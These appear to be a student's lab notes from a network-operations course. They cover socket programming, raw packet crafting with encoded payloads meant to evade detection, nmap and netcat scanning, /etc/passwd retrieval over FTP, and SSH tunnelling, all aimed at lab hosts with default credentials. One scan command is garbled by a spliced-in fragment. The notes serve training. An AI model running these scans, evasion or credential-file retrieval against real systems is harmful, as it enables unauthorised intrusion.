s.listen(1)
os.system("clear")
print ("Waiting for TCP connections\n")
while 1:
    conn, addr = s.accept()
    connect = conn.recv(1024)
    address, port = addr
    print ("Message Received - '%s'" % connect.decode())
    print ("Sent by -", address, "port -", port, "\n")
    conn.sendall(message)
    conn.close()
```


## Datagram Sockets S/R DEMO


vim script.py

chmod +x script.py

nc -luvp 1111  **UDP needs U option**

./script.py


IP_ADDR

PORT

IP

MESSAGE

**SENDER**
```
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
ip_addr = '127.0.0.1'
port = 2222
message = b"Message"
s.sendto(message, (ip_addr, port))
data, addr = s.recvfrom(1024)
print(data.decode())
```
**UTF8** default





**RECIEVER**
```
#!/usr/bin/python3
import socket
import os
port = 2222
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,0)
s.bind(('', port))
os.system("clear")
print ("Awaiting UDP Messages")
while True:
    data, addr = s.recvfrom(1024)
    address, port = addr
    print ("\nMessage Received: '%s'" % data.decode())
    print ("Sent by -", address, "port", port)
    s.sendto(b"Message received by the UDP Message Server!", addr)
```


## RAW IPv4 Sockets DEMO

    RAW Socket scripts must include the IP header and the next headers.

    Requires guidance from the "Request for Comments" (RFC) to follow header structure properly.

        RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.

    See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.
    Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering

    Avoiding defense mechanisms

    Obfuscating data during transfer

    Manually crafting a packet with the chosen data in header fields

 
**IPRAW.PY**
```
#!/usr/bin/python3
# For building the socket
import socket
# For system level commands
import sys
# For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import pack
# For encoding
import base64    # base64 module
import binascii    # binascii module
# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit() 
# 0 or IPPROTO_TCP for STREAM and 0 or IPPROTO_UDP for DGRAM. (man ip7). For SOCK_RAW you may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
# IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.
# IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (link)
packet = ''
src_ip = "127.0.0.1" 
dst_ip = "127.0.0.1" 

##################
##Build Packet Header##
##################
# Lets add the IPv4 header information
# This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl = 69
# This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos = 0
# The kernel will fill in the actually length of the packet
ip_len = 0
# This sets the IP Identification for the packet. 1-65535
ip_id = 24518
# This sets the RES/DF/MF flags and fragmentation offset
ip_frag = 0 
# This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl = 64
# This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto = 16
# The kernel will fill in the checksum for the packet
ip_check = 0
# inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)

#################
## Pack the IP Header ##
#################
# This portion creates the header by packing the above variables into a structure. The ! in the string means 'Big-Endian' network order, while the code following specifies how to store the info. Endian explained. Refer to link for character meaning.
ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

##########
##Message##
##########
# Your custom protocol fields or data. We are going to just insert data here. Add your message where the "?" is. Ensure you obfuscate it though...don't want any clear text messages being spotted! You can encode with various data encodings. Base64, binascii
message = b'last_name'                  #This should be the student's last name per the prompt
hidden_msg = binascii.hexlify(message)  #Students can choose which encodeing they want to use.
# final packet creation
packet = ip_header + hidden_msg
# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))
# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send less bytes than you requested, but returns the number of bytes sent.
# socket.sendall is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send until everything has been sent or an error occurs.


```


chmod +x ipraw.py

sudo tcpdump

tcpdump 'ip[4:2]=24518' -vvXX
```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:27:38.667260 IP (tos 0x0, ttl 64, id 24518, offset 0, flags [none], proto unknown (16), length 30)
    localhost > 172.16.82.106:  chaos 10
	0x0000:  fa16 3ea3 4c94 fa16 3e6c 549f 0800 4500  ..>.L...>lT...E.
	0x0010:  001e 5fc6 0000 4010 9d8e 7f00 0001 ac10  .._...@.........
	0x0020:  526a 3533 3666 3663 3639 3733            Rj536f6c6973
```



**TCPRAW.PY**
```
#!/usr/bin/python3
# For building the socket
import socket
# For system level commands
import sys
# For doing an array in the TCP checksum
import array
# For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import pack
# For encoding
import base64    # base64 module
import binascii    # binascii module
# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit() 
# 0 or IPPROTO_TCP for STREAM and 0 or IPPROTO_UDP for DGRAM. (man ip7). For SOCK_RAW you may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
# IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.
# IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (link)

src_ip = "127.0.0.1"
dst_ip = "1.1.1.1"

##################
##Build Packet Header##
##################
# Lets add the IPv4 header information
# This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl =
# This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos =
# The kernel will fill in the actually length of the packet
ip_len = 0
# This sets the IP Identification for the packet. 1-65535
ip_id = 1775
# This sets the RES/DF/MF flags and fragmentation offset
ip_frag = 0
# This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl = 128
# This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto = 6 
# The kernel will fill in the checksum for the packet
ip_check = 0
# inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)

#################
## Pack the IP Header ##
#################
# This portion creates the header by packing the above variables into a structure. The ! in the string means 'Big-Endian' network order, while the code following specifies how to store the info. Endian explained. Refer to link for character meaning.

ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

################
##Build TCP Header##
################
# source port. 1-65535
tcp_src = 30
# destination port. 1-65535
tcp_dst = 322
# sequence number. 1-4294967296
tcp_seq = 7
# tcp ack sequence number. 1-4294967296
tcp_ack_seq = 0
# can optionaly set the value of the offset and reserve. Offset is from 5 to 15. RES is normally 0.
#tcp_off_res = 
# data offset specifying the size of tcp header * 4 which is 20
tcp_data_off = 5
# the 3 reserve bits + ns flag in reserve field
tcp_reserve = 0
# Combine the left shifted 4 bit tcp offset and the reserve field
tcp_off_res = (tcp_data_off << 4) + tcp_reserve   
# can optionally just set the value of the TCP flags
#tcp_flags =
# Tcp flags by bit starting from right to left
tcp_fin = 0                    # Finished
tcp_syn = 1                    # Synchronization
tcp_rst = 0                    # Reset
tcp_psh = 1                    # Push
tcp_ack = 1                    # Acknowledgement
tcp_urg = 0                    # Urgent
tcp_ece = 0                    # Explicit Congestion Notification Echo
tcp_cwr = 0                    # Congestion Window Reduced
# Combine the tcp flags by left shifting the bit locations and adding the bits together
tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5) + (tcp_ece << 6) + (tcp_cwr << 7)
# maximum allowed window size reordered to network order. 1-65535 (socket.htons is deprecated)
tcp_win = 65535
# tcp checksum which will be calculated later on
tcp_chk = 0
# urgent pointer only if urg flag is set
tcp_urg_ptr = 0

# The ! in the pack format string means network order
tcp_hdr = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win, tcp_chk, tcp_urg_ptr)

##########
##Message##
##########

# Your custom protocol fields or data. We are going to just insert data here.
# Ensure you obfuscate it though...don't want any clear text messages being spotted!
# You can encode various data encodings. Base64, binascii

message = b'Solis'                                    # This should be the student's last name per the prompt
hidden_msg = base64.b64encode(message)                    # base64.b64encode will encode the message to Base 64

######################
##Create the Pseudo Header##
######################

# After you create the tcp header, create the pseudo header for the tcp checksum.

src_address = socket.inet_aton(src_ip)
dst_address = socket.inet_aton(dst_ip)
reserved = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_hdr) + len(hidden_msg)

#####################
##Pack the Pseudo Header##
#####################

ps_hdr = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_length)
ps_hdr = ps_hdr + tcp_hdr + hidden_msg

#########################
##Define the Checksum Function##
#########################

def checksum(data):
        if len(data) % 2 != 0:
                data += b'\0'
        res = sum(array.array("H", data))
        res = (res >> 16) + (res & 0xffff)
        res += res >> 16
        return (~res) & 0xffff

tcp_chk = checksum(ps_hdr)

##############
##Final TCP Pack##
##############

# Pack the tcp header to fill in the correct checksum - remember checksum is NOT in network byte order
tcp_hdr = pack('!HHLLBBH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win) + pack('H', tcp_chk) + pack('!H', tcp_urg_ptr)

# Combine all of the headers and the user data
packet = ip_header + tcp_hdr + hidden_msg

# s.connect((dst_ip, port)) # typically used for TCP
# s.send(packet)

# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))

# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send fewer bytes than you requested, but returns the number of bytes sent.
#socket.sendall ﻿is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send ﻿ until everything has been sent or an error occurs.

```

chmod +x tcpraw.py

sudo tcpdump 'tcp[4:4] = 7' -vvXX (sequence number in tcp header)

sudo ./tcpraw.py

cyberchef the hex



## Encoding and Decoding

Encoding - taking bits and converting them 

Decoding - reversing

Encoding converts the data into a different format

Encryption scrambles that data to make it unreadable without a secret key

![image](https://github.com/user-attachments/assets/959f0a3b-4fa4-4539-a5c3-5b5afd9948e9)



## HEX, BASE64 Encoding (Commands)


Encode text to Hex:
```
    echo "Message" | xxd
```


Encode file to Hex:
```
    xxd file.txt file-encoded.txt
```


Decode file from Hex:
```
    xxd -r file-encoded.txt file-decoded.txt
```


Encode text to base64:
```
    echo "Message" | base64
```


Endode file to Base64:
```
    base64 file.txt > file-encoded.txt
```


Decode file from Base64:
```
    base64 -d file-encoded.txt > file-decoded.txt
```




## Python HEX,BASE64 ENCODING (Commands)

HEX
```
import binascii

message = b'Message'
hidden_msg = binascii.hexlify(message)


```


BASE64
```
import base64

message = b'Message'
hidden_msg = base64.b64encode(message)
```



## DSCP Conversion Chart

https://bytesolutions.com/dscp-tos-cos-precedence-conversion-chart/





DSCP = 24

24 --> HEX

0x18 ---> Binary

00011000 --- Shift 2 for ECN Flag

01100000 --- Final DSCP Value 0x60



## RAW Socket CHALLENGE 

Gorgan forces, tool development cell have provided IPRAW.py for your teams use, it defines the basic structure of the desired result.

    Create a raw socket and code your message into the socket.
    Send your last name as the data.
    The sent data is required to be encoded, with a final result of the data being in hex.
    When viewing in Wireshark, the packet should not be malformed.


Source IP: 10.10.0.40

Target IP: 172.16.1.15

DSCP: 24

IP ID: 1984

Protocol: CHAOS

To receive the flag:

    Open a netcat listener on port 1111 on the Internet_Host.
    nc -lvp 1111
    send your RAW Socket



# Mapping

Initial Start Point

Ports

Credentials

Student:Password


1. First Router IP Address 172.16.20.1
2. Net Recon Method:
	-Host Discovery
	-Port Discovery
   	-Port Validation
	-Follow On


## NMAP

```
nmap -Pn -T4 172.16.20.1 -p21-23,80

nmap –sS 172.16.32.2

nmap –sT –sV 10.16.32.23

nmap -sN 10.50.1.1

nmap -sF 25.50.75.100

nmap -sX 7.92.5.19

nmap –sU -v 10.10.100.3

nmap -O 6.2.9.5 FingerPrint

nmap -sV 10.30.50.70 Version Scan
```

## Steps to MAPPING

```
Creds:
Bios or Student

ssh vyos@172.16.0.0
ssh student@172.16.0.0

student:password
vyos:password
```

```
Find ports
nmap -Pn -T4 172.16.20.1 -p21-23,80 --open
22/ssh

Validate ports Banner Grab
nc 172.16.20.1 22
SSH-2.0

If port **21 or 80**
wget -r IP_Address or
wget -r ftp://IP_Address or
firefox IP_Address

HTML Files
wget -r IP_Addre
FILE SAVES WITH IP_ADDR
cat IP_ADDR/*

firefox 172.16.1.15/index.html

FTP SERVER

wget -r ftp://IP_ADDR
cat 172.16.1.15/welcome
ftp IP_ADDR
student
password
ftp> passive
ftp> ls
ftp> pwd
/home/student
ftp> cd ..
/home
ftp> get /etc/passwd (GET FILE_NAME)
exit

cat /etc/passwd
downloads and saves it to your PWD




NOT PORT 21 or 80

wget-r http://172.16.1.15:8080




If **22 or 23** Connect and Passive Recon
Passive:
hostname (SHOWS HOSTNAME)
sudo -l
ip a
show interfaces (vyos) (SHOWS INTERFACES IP_Address and Description) CP to Map
ip neigh
ip route
show ip route (vyos)

Flags of Interest
find / -iname "flag"
find /


Which
which ping tcpdump nmap nc wireshark
sudo -l
sudo which ping tcpdump nmap nc wireshark

Ping Sweep
for i in {1..254} ;do (ping -c 1 172.16.20.$i 2>/dev/null | grep "bytes from" &) ;done


Duckduckgo
Search for IP and CIDR to change your PING command to whatever host they can have

NMAP Scan the NETWORK

nmap -Pn -T4 172.16.20.10/29 -p21-23,80 --open SCAN NETWORK FOR HOST
FILTERED = closed to outside

Port Validate across the PORTS

PROFTP is FPT
wget -r ftp://IP_Address
ls
get FILE_NAME


Diamonds with ?? is TELNET

HTTP Port
nc 172.16.1.15 80
ndjakndfksa



Passive Recon

telnet 172.16.1.15
hostname (COPY and MAP)
sudo -l
ip a (SHOWS INTERFACES) 
ip n (MIGHT SHOW BOXES THAT HAVE SPOKEN)
ip route (SHOWS ROUTES)
find / -iname flag* 2>/dev/null (SEARCHES FOR A FILE NAME FLAG)
find / -iname hint* 2>/dev/null (SEARCHES FOR A FILE NAME HINT)
ss -ntlp (name reso, tcp ports, listening ports, ports) (LISTPORTS)
which tcpdump wireshark nmap telnet get curl ping
sudo !! (TELLS WHAT CMDS REQUIRE SUDO FOR)



ssh student@IP_ADDR
ssh vyos@IP_ADDR

```

# Mapping (CONT)
```
Net Recon Methodology x-
• Host discovery
• Ruby ping sweep (if ping available)
• Nmap scan if no ping
• Port Discovery
• nmap
• nc scan script
• Port Validation
• Banner grabbing using nc
• Follow-on actions based on ports found
• if 21 or 80 wget -r IP_ADDRESS (or) wget -r ftp://IP_ADDRESS (or) firefox
• if 21 FTP [IP ADDR] connects to ftp server : isve
• get [file name]
• If 22 or 23 CONNECT and PASSIVE RECON
Scan Methodology
nmap -Pn [IP Addr] -T4 -p 21-23,80
: Specien based 23.ins/chues found
• Well known port range
• which tepdump wireshark map telnet get curl ping
• • 0 - 1023 (Actually scan 1-1023)
• Chunks of 2000 or first 10000 ports (65535)
• Hail Mary - Scan all the ports (65535)
Passive Recon Methodology
Italicized/bolded words are commands
: Permissions:
• sudo -l
• Interfaces and subnets
• ip a
• show interface {VYOS}
• Neighbors
• ip neigh
• Routing Table
• ip route
• show ip route VYOS}
• Files of interest
o find / -iname flag* o find / -iname hint*
• Other listening ports
• ss -ntip
• Available Tools
• which tepdump wireshark map telnet get curl ping
```


# Service and Network Discovery
https://net.cybbh.io/-/public/-/jobs/874023/artifacts/modules/networking/slides-v4/07_discovery.html

Reconnaissnace Stages

-Active External

-Passive External

-Active Internal

-Active External


![image](https://github.com/user-attachments/assets/925068c6-7c31-4136-9982-cd316be3902b)

Recon Steps

Network Footprinting

Network Scanning

Network Enumeration

Vulnerability Scanning

Network Footprinting

    Collect information relating to target

        Network

        Systems

        Organization

Network Scanning

    Port Scanning

    Network Scanning

    Vulnerability Scanning

Network Enumeration

    Network Resource and shares

    Users and Groups

    Routing tables

    Auditing and Service settings

    Machine names

    Applications and banners

    SNMP and DNS details

    Other common services and ports

Vulnerability Assessment

    Injection

    Broken Authentication

    Sensitive Data Exposure

    XML External Entities

    Broken Access Control

    Security Misconfiguration

    Software/Components with Known Vulnerabilities


## Passive External

OSINT 

3rd Party Sites

Not sending any information via their network

## DIG and WHOIS (CMD)

```
dig zonetransfer.me (soa,mx,ns,etc)
dig zonetransfer.me A
dig zonetransfer.me AAAA
dig zonetransfer.me MX
dig zonetransfer.me TXT
dig zonetransfer.me NS
dig zonetransfer.me SOA
```

## Zone Transfer (CMD)

```
dir axfr {@soa.server} {target-site}
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

## Passive OS FingerPrinting P0F (CMD)

```
more /etc/p0f/p0f.fp

sudo p0f -i eth0

sudo p0f -r test.pcap
```


## Active External
```
Scanning Nature : Active and Passive

Scanning Strategy : Remote to Local

Local to Local

Local to Remote

Remote to Remote
```

Scanning Approach
```
    Aim

        Wide range target scan

        Target specific scan

    Method

        Single source scan

            1-to-1 or 1-to-many

        Distributed scan

            many-to-one or many-to-many

Vertical Scan - Range of Ports on 1 box

Horizontal Scan - 1 or many ports on a range of boxes


```


## NMAP Scan Types (CMD)
MUST USE SUDO FOR 
```
    -PE ICMP Ping
    -Pn - no Ping

    Broadcast Ping/Ping sweep (-sP, -PE)

    SYN scan (-sS)
	It sends a SYN and recieves and SYN/ACK but stops sending traffic

    Full connect scan (-sT)
	It sends all THREE SYN, SYN/ SYN,ACK/ ACK 

    Null scan (-sN)

    FIN scan (-sF)

    XMAS tree scan (-sX)

    UDP scan (-sU)

    Idle scan (-sI)

    Decoy scan (-D)

    ACK/Window scan (-sA)

    RPC scan (-sR)

    FTP scan (-b)

    OS fingerprinting scan (-O)

    Version scan (-sV)

    Discovery probes
```

## NMAP TIME OUT -T

```
    -T0 - Paranoid - 300 Sec

    -T1 - Sneaky - 15 Sec

    -T2 - Polite - 1 Sec

    -T3 - Normal - 1 Sec

    -T4 - Aggresive - 500 ms

    -T5 - Insane - 250 ms

    --scan-delay <time> - Minimum delay between probes

    --max-scan-delay <time> - Max delay between probes

    --min-rate <number> - Minimum packets per second

    --max-rate <number> - Max packets per second
```

## Traceroute - Firewalking (CMD)
```
traceroute 172.16.82.106
traceroute 172.16.82.106 -p 123
sudo traceroute 172.16.82.106 -I
sudo traceroute 172.16.82.106 -T
sudo traceroute 172.16.82.106 -T -p 443
```

## Netcat - Scanning (CMD)
```
nc [Options] [Target IP] [Target Port(s)]
```

```
    -z : Port scanning mode i.e. zero I/O mode

    -v : Be verbose [use twice -vv to be more verbose]

    -n : do not resolve ip addresses

    -w1 : Set time out value to 1

    -u : To switch to UDP

```

## Netcat - Scanning Horizontal Scan (CMD)
Range of IPs for specific ports

    TCP
```
for i in {1..254}; do nc -Windows: route print
Linux: ip route (netstat -r deprecated)
VyOS: show ip routenvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
```
    UDP
```
for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 &
```

## Netcat - Scanning Vertical Scan (CMD)

Range of ports on specific IP

    TCP
```
nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
```
    UDP
```
nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
```

## Netcat - TCP Scan Script (CMD)
vim script.sc

```
#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

```

```
Enter network address (e.g. 192.168.0): 
172.16.82
Enter starting host range (e.g. 1): 
106
Enter ending host range (e.g. 254): 
106
Enter ports space-delimited (e.g. 21-23 80): 
21-23 80 
(UNKNOWN) [172.16.82.106] 23 (telnet) open
(UNKNOWN) [172.16.82.106] 22 (ssh) open
(UNKNOWN) [172.16.82.106] 21 (ftp) open
(UNKNOWN) [172.16.82.106] 80 (http) open
```

## Netcat - UDP Scan Script (CMD)

```
#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done
```

## Netcat - Banner Grab (CMD)

Find what is running on a particular port
```
nc [Target IP] [Target Port]
nc 172.16.82.106 22
nc -u 172.16.82.106 53
```
-u : To switch to UDP


## Curl and Wget (CMD)

Both can be used to interact with the HTTP, HTTPS and FTP protocols.

Curl - Displays ASCII PRINT TO TERMINAL
```
curl http://172.16.82.106
curl ftp://172.16.82.106
```

COPIES ALL FILES AND SAVES TO SYSTEM

Wget - Downloads (-r recursive)
```
wget -r http://172.16.82.106
wget -r ftp://172.16.82.106
```

## Passive Internal Discovery (PACKET SNIFFERS)

Wireshark 

TCP DUMP

p0f

Limited to traffic in same local area of network

## COMMANDS (CMD)

TCP/IP Network Configuration
```
Windows: ipconfig /all
Linux: ip address (ifconfig depreciated)
VyOS: show interface
```

DNS Configurations
```
Windows: ipconfig /displaydns
Linux: cat /etc/resolv.conf
```

Arp Cache
```
Windows: arp -a
Linux: ip neighbor (arp -a depreciated)
```

Network Connections
```
Windows: netstat
Linux: ss (netstat depreciated)

Example options useful for both netstat and ss: -antp
a = Displays all active connections and ports.
n = No determination of protocol names. Shows 22 not SSH.
t = Display only TCP connections.
u = Display only UDP connections.
p = Shows which processes are using which sockets.
```

Services
```
Windows: %SystemRoot%\system32\drivers\etc\services

Linux/Unix: /etc/services
```

OS Information
```
Windows: systeminfo
Linux: uname -a and /etc/os-release
```

Running Processes
```
Windows: tasklist
Linux: ps or top

Example options useful for ps: -elf
e = Show all running processes
l = Show long format view
f = Show full format listing
```


Command Path
```
which
whereis
```

Routing Table
```
Windows: route print
Linux: ip route (netstat -r deprecated)
VyOS: show ip route
```

File Search
```
find / -name hint* 2> /dev/null
find / -iname flag* 2> /dev/null
```

## Active Internal Discovery

## Commands
Arp Scanning
```
arp-scan --interface=eth0 --localnet

nmap -sP -PR 172.16.82.96/27
```

Ping Scanning 
```
ping -c 1 172.16.82.106

for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

sudo nmap -sP 172.16.82.96/27
```


## No NC? Use DEV (CMD)
dev/tcp banner grabbing
```
exec 3<>/dev/tcp/172.16.82.106/22; echo -e "" >&3; cat <&3
```

dev/tcp scanning
```
for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done
```



## Performing Network Forensics - Mapping

Diagram Devices

Line Types

Written Information

coloring

Grouping

![image](https://github.com/user-attachments/assets/4597be58-bdd4-4a84-96b8-0e67185b7339)

```
    Device type (Router/host)

    System Host-names

    Interface names (eth0, eth1, etc)

    IP address and CIDRs for all interfaces

    TCP and UDP ports

    MAC Address

    OS type/version

    Known credentials
```
https://app.diagrams.net/

## MAP COPY AND PASTE

```
Dev:
Hostname:
Interfaces:
IP:
Ports:
MAC:
OS:
Creds:
```


```
DEVICE: ROUTER/ HOST
OS: MICROSOFT
Creds: student:xxxxxx
Interfaces: ETH0
Ports: x,x,x,x
```

![image](https://github.com/user-attachments/assets/1b1b96b1-a532-40af-95ad-88abb839f268)




# File Transfer and Redirection
## Common Transfering Data Methods

TFTP

FTP ACtive and Passive

FTPS

SFTP

SCP


## FTP Active  (CMD)
For Anonymous
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

```

For User
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```


## FTP Passive (CMD)

With WGET
```
student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
--2024-05-03 15:09:01--  ftp://10.0.0.104/
           => ‘10.0.0.104/.listing’
Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
done.    ==> LIST ... done.

{output omitted}

FINISHED --2024-05-03 15:09:01--
Total wall clock time: 0.03s
Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)

```

For Anomynous
```

student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 17:20:09 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```

Passive for USER

```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,168,167).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```


## SCP Options + Syntax (CMD)

Options

. present working directory

-v Verbose Mode

-P Alternate Port

-r Recursively Copy

-3 3-way Copy

HOW TO USE
```
scp user@IP.ADD.RR.SS:whatyouwant.txt whereyouwantit
```
Download a file from a remote directory to a local directory
```
	$ scp student@172.16.82.106:secretstuff.txt /home/student
```


Upload a file to a remote directory from a local directory
```
	$ scp secretstuff.txt student@172.16.82.106:/home/student
```


Copy a file from a remote host to a separate remote host
```
	$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
	password:    password:
```

Recursive upload of a folder to remote
```
	$ scp -r folder/ student@172.16.82.106:
```


Recursive download of a folder from remote
```
	$ scp -r student@172.16.82.106:folder/ .
```


## SCP Alternate SSHD (CMD)


SCP Syntax w/ alternate SSHD

Download a file from a remote directory to a local directory
```
$ scp -P 1111 student@172.16.82.106:secretstuff.txt .
```

Upload a file to a remote directory from a local directory
```
$ scp -P 1111 secretstuff.txt student@172.16.82.106:
```


## SCP Through a TUNNEL (CMD)

```
Create a local port forward to target device

$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory

$ scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@localhost:/home/student
```

## SCP Through Dynamic Port Forwarding (CMD)

```
SCP Syntax through a Dynamic Port forward
Create a Dynamic Port Forward to target device

$ ssh student@172.16.82.106 -D 9050 -NT

Download a file from a remote directory to a local directory

$ proxychains scp student@localhost:secretstuff.txt .

